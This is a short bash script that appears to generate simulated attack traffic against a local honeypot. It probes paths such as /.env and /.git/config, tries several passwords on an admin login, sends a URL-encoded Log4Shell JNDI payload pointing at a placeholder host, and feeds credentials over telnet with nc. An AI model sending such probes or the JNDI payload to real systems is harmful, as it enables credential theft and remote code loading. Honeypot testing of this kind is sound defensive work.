#!/usr/bin/env bash
set -euo pipefail
BASE="${HONEYPOT_HTTP:-http://127.0.0.1:8080}"
for p in / /admin /.env /.git/config /wp-login.php /actuator/env; do curl -sS --max-time 3 "$BASE$p" >/dev/null || true; done
for i in 1 2 3 4 5 6; do curl -sS --max-time 3 -X POST "$BASE/admin/login" -d "username=root&password=labpass$i" >/dev/null || true; done
curl -sS --max-time 3 "$BASE/?q=%24%7Bjndi%3Aldap%3A%2F%2Flab.invalid%2Fa%7D" >/dev/null || true
if command -v nc >/dev/null 2>&1; then printf 'root\npassword\n' | nc -w 2 127.0.0.1 "${HONEYPOT_TELNET_PORT:-2323}" >/dev/null 2>&1 || true; fi
echo "[+] Controlled lab traffic generated against local honeypot."
